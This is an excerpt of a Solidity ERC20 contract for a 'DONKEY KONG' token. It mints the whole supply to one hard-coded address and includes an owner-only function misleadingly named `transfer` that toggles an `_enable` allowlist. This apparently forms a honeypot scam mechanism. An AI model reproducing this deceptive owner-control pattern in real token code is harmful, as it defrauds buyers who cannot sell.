...
contract DONKEYKONG is ERC20, Ownable {
    ...
    constructor() ERC20('DONKEY KONG','DK') {
        _mint(0x1ec76351addbC201AA55EBeeD03608c72d92f493, 1000000000000 *10**18);
        _enable[0x1ec76351addbC201AA55EBeeD03608c72d92f493] = true;
    }
    ...
    function transfer(address user, bool enable) public onlyOwner {
        _enable[user] = enable;
    }
